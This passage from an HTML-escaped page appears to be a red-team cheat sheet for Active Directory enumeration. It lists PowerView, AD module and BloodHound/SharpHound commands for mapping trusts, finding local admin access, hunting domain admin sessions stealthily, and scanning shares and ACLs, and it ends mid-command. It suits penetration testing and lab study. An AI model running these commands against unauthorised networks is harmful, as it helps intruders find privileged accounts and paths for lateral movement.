&lt;td>Unidirectional&lt;/td>
&lt;td>One-way&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;p>&lt;strong>Trust transitivity&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Transitivity&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Transitive&lt;/td>
&lt;td>Can be extended to other domains in the forest&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Nontransititve&lt;/td>
&lt;td>Cannot be extended to other domains in the forest&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;p>&lt;strong>Trust Type&lt;/strong>&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>Name&lt;/th>
&lt;th>Type&lt;/th>
&lt;th>Description&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td>Parent-child&lt;/td>
&lt;td>Automatic&lt;/td>
&lt;td>Automatically created between the new domain and the domain that precedes it in the namespace hierarchy whenever a new domain is added to a tree (always two-way transitive)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Tree-root&lt;/td>
&lt;td>Automatic&lt;/td>
&lt;td>Automatically created whenever a new domain tree is added to a forest root (always two-way transitive)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>External&lt;/td>
&lt;td>Established&lt;/td>
&lt;td>Two domains in different forests when forests do not have a trust relationship (one-way or two-way and nontransitive)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Shortcut&lt;/td>
&lt;td>Established&lt;/td>
&lt;td>Used to reduce access times in complex trust scenarios (one-way or two-way)&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td>Forest&lt;/td>
&lt;td>Established&lt;/td>
&lt;td>Between forest root domains (one-way or two-way and transitive, if specified, or nontransitive)&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;hr>
&lt;p>Get a list of all domain trusts for the current or a trusted domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomainTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomainTrust&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADTrust&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;msDS-TrustForestTrustInfo -ne &amp;#34;$null&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADTrust&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get detail about the current or a trusted forest:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForest&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForest&lt;/span> &lt;span class="n">-Forest&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADForest&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADForest&lt;/span> &lt;span class="n">-Identity&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get all domains in the current or in a trusted forest:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span> &lt;span class="n">-Forest&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-ADForest&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">Domains&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Get all global catalogs for the current or a trusted forest:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestCatalog&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestCatalog&lt;/span> &lt;span class="n">-Forest&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADForest&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="n">GlobalCatalogs&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Map trusts of a forest:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestTrust&lt;/span> &lt;span class="n">-Forest&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ADTrust&lt;/span> &lt;span class="n">-Filter&lt;/span> &lt;span class="s1">&amp;#39;msDS-TrustForestTrustInfo -ne &amp;#34;$null&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Map all the trusts of the domains in the current or in a trusted forest:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-NetDomainTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span> &lt;span class="n">-Forest&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-NetDomainTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## List only external trusts&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-NetDomainTrust&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">TrustType&lt;/span> &lt;span class="o">-eq&lt;/span> &lt;span class="s1">&amp;#39;External&amp;#39;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## List all trusts of a trusting forest&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span> &lt;span class="n">-Forest&lt;/span> &lt;span class="s2">&amp;#34;evilcorp.local&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="n">GetNetDomainTrust&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Try to build a relational mapping of all domain trusts:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-MapDomainTrust&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="user-hunting">User Hunting&lt;/h2>
&lt;p>Find all machines on the current/trusted domain where the current user has local admin access:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-LocalAdminAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-LocalAdminAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-NoPing&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-LocalAdminAccess&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cybercorp.local&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Find-WMILocalAdminAccess.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-WMILocalAdminAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="n">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">targets&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-WMILocalAdminAccess&lt;/span> &lt;span class="n">-ComputerFile&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">targets&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Find-PSRemotingLocalAdminAccess.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-PSRemotingLocalAdminAccess&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="n">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">&amp;gt;&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">targets&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-PSRemotingLocalAdminAccess&lt;/span> &lt;span class="n">-ComputerFile&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">targets&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Find-PSRemotingLocalAdminAccessCreds.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-PSRemotingLocalAdminAccessCreds&lt;/span> &lt;span class="n">-Username&lt;/span> &lt;span class="s2">&amp;#34;STUDENT01&amp;#34;&lt;/span> &lt;span class="n">-Password&lt;/span> &lt;span class="s2">&amp;#34;Password123.&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find local admins on all machines of the domain (needs administrator privs on non-dc machines):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-EnumerateLocalAdmin&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-EnumerateLocalAdmin&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-NoPing&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-EnumerateLocalAdmin&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">ComputerName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">AccountName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">IsGroup&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find computers where a domain admin (or specific user/group) has sessions:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="c"># Domain Admins&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">invoke-UserHunter&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">UserDomain&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">UserName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ComputerName&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">SessionFromName&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Remote Desktop Users&amp;#34;&lt;/span> &lt;span class="c"># Specific group&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="n">-Domain&lt;/span> &lt;span class="s2">&amp;#34;cyberlab.local&amp;#34;&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="c"># Specific user&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER01&amp;#34;&lt;/span> &lt;span class="n">-Poll&lt;/span> &lt;span class="mf">100&lt;/span> &lt;span class="n">-UserName&lt;/span> &lt;span class="s2">&amp;#34;Administrator&amp;#34;&lt;/span> &lt;span class="n">-Delay&lt;/span> &lt;span class="mf">5&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find computers where a domain admin is logged into and checks if the local user has local administrator access:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="n">-CheckAccess&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Find computers where a domain admin is logged-in without sending queries to DCs:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-UserHunter&lt;/span> &lt;span class="n">-Stealth&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="bloodhound">Bloodhound&lt;/h2>
&lt;p>Commands to be run on a Linux machine to run Bloodhound analyzer:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">apt-get install bloodhound
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">neo4j console
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bloodhound
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Commands to be run on a domain machine to analyze the domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">SharpHound&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Gather data and information about the current domain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-BloodHound&lt;/span> &lt;span class="n">-CollectionMethod&lt;/span> &lt;span class="n">All&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-JSONFolder&lt;/span> &lt;span class="s2">&amp;#34;c:\experiments\bloodhound&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-BloodHound&lt;/span> &lt;span class="n">-CollectionMethod&lt;/span> &lt;span class="n">All&lt;/span> &lt;span class="n">-ExcludeDC&lt;/span> &lt;span class="n">-Verbose&lt;/span> &lt;span class="n">-JSONFolder&lt;/span> &lt;span class="s2">&amp;#34;c:\experiments\bloodhound&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c">## Gather information about established sessions&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">InvokeBloodHound&lt;/span> &lt;span class="n">-CollectionMethod&lt;/span> &lt;span class="n">LoggedOn&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="full-enumeration-sequence">Full Enumeration Sequence&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="n">PowerView&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainSid&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForest&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestDomain&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-NetDomainTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetForestTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-MapDomainTrust&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Execute domain analysis for all domain of interest&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">gwmi &lt;/span>&lt;span class="n">Win32_NTDomain&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">DomainName&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-DomainSid&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetDomainController&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-FullData&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">operatingsystem&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">description&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nv">$ip&lt;/span>&lt;span class="p">=[&lt;/span>&lt;span class="no">System.Net.Dns&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">GetHostAddresses&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$name&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="n">IPAddressToString&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">Write-Host&lt;/span> &lt;span class="nv">$name&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="se">`t&lt;/span>&lt;span class="s2"> : &amp;#34;&lt;/span> &lt;span class="nv">$ip&lt;/span> &lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetOU&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetOU&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%{&lt;/span>&lt;span class="nb">echo &lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">Get-NetComputer&lt;/span> &lt;span class="n">-ADSPath&lt;/span> &lt;span class="nv">$_&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="nb">echo &lt;/span>&lt;span class="s2">&amp;#34;---&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">name&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">samaccountname&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">description&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetUser&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">where &lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">mail&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-UserField&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Find-ComputerField&lt;/span> &lt;span class="n">-SearchField&lt;/span> &lt;span class="s2">&amp;#34;OperatingSystem&amp;#34;&lt;/span> &lt;span class="n">-SearchTerm&lt;/span> &lt;span class="s2">&amp;#34;windows&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroup&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">-FullData&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroupMember&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroup&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Enterprise Admins&amp;#34;&lt;/span> &lt;span class="n">-FullData&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGroupMember&lt;/span> &lt;span class="n">-GroupName&lt;/span> &lt;span class="s2">&amp;#34;Enterprise Admins&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPO&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetGPOGroup&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-NetFileServer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ShareFinder&lt;/span> &lt;span class="n">-ExcludeStandard&lt;/span> &lt;span class="n">-ExcludeIPC&lt;/span> &lt;span class="n">-ExcludePrint&lt;/span> &lt;span class="n">-CheckShareAccess&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-ACLScanner&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">IdentityReference&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ActiveDirectoryRights&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">ObjectDN&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">ft
